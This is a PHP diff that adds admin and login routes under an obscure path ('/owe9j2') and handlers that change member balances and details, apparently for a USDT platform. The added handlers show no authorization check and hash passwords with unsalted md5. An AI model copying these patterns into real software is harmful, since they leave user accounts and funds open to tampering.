@@ -23,7 +23,8 @@ function table_resp($data, $count = null) {
 $adminRoutes = [
     '/admin', '/admin/', '/admin/index', '/admin/index.html',
     '/usdt', '/usdt/', '/app/admin', '/app/admin/', '/app/admin/index', '/app/admin/index.html',
-    '/owe9j2', '/owe9j2/', '/owe9j2/index', '/owe9j2/index.html'
+    '/owe9j2', '/owe9j2/', '/owe9j2/index', '/owe9j2/index.html',
+    '/admin/owe9j2', '/admin/owe9j2/', '/admin/owe9j2/index'
 ];
 if (in_array($uri, $adminRoutes)) {
     if (file_exists(__DIR__ . '/usdt_logged_in.html')) {
@@ -37,7 +38,7 @@ if (in_array($uri, $adminRoutes)) {
 $loginRoutes = [
     '/app/admin/account/login', '/app/admin/login',
     '/admin/login', '/admin/login/index', '/admin/account/login',
-    '/owe9j2/login', '/owe9j2/login/index'
+    '/owe9j2/login', '/owe9j2/login/index', '/admin/owe9j2/login'
 ];
 if (in_array($uri, $loginRoutes)) {
     $username = $_POST['username'] ?? '';
@@ -310,6 +311,42 @@ if (preg_match('#^/admin/(system|member|bill|report)/#', $uri)) {
             json_resp(null, 0, '状态更新成功');
         }
         json_resp(null, 1, '更新失败');
+    }
+
+    // F2. 会员余额修改 /admin/member/user/modifymoney
+    if ($uri === '/admin/member/user/modifymoney') {
+        $uid = intval($_POST['uid'] ?? $_POST['id'] ?? 0);
+        $money = floatval($_POST['money'] ?? $_POST['balance'] ?? 0);
+        $type = intval($_POST['type'] ?? 1);
+        if ($uid && $money > 0) {
+            if ($type == 1) {
+                \think\Db::name('xy_users')->where('id', $uid)->setInc('balance', $money);
+            } else {
+                \think\Db::name('xy_users')->where('id', $uid)->setDec('balance', $money);
+            }
+            json_resp(null, 0, '余额修改成功');
+        }
+        json_resp(null, 1, '修改失败');
+    }
+
+    // F3. 会员详情与修改 /admin/member/user/edit
+    if ($uri === '/admin/member/user/edit') {
+        $uid = intval($_REQUEST['uid'] ?? $_REQUEST['id'] ?? 0);
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $updateData = [];
+            if (isset($_POST['balance'])) $updateData['balance'] = floatval($_POST['balance']);
+            if (isset($_POST['level'])) $updateData['level'] = intval($_POST['level']);
+            if (isset($_POST['status'])) $updateData['status'] = intval($_POST['status']);
+            if (isset($_POST['pwd']) && $_POST['pwd'] !== '') $updateData['pwd'] = md5($_POST['pwd']);
+            if ($uid && !empty($updateData)) {
+                \think\Db::name('xy_users')->where('id', $uid)->update($updateData);
+                json_resp(null, 0, '会员信息保存成功');
+            }
+            json_resp(null, 1, '保存失败');
+        } else {
+            $user = \think\Db::name('xy_users')->where('id', $uid)->find();
+            json_resp($user);
+        }
     }
 
     // G. 充值订单查询 /admin/bill/user-recharge/select
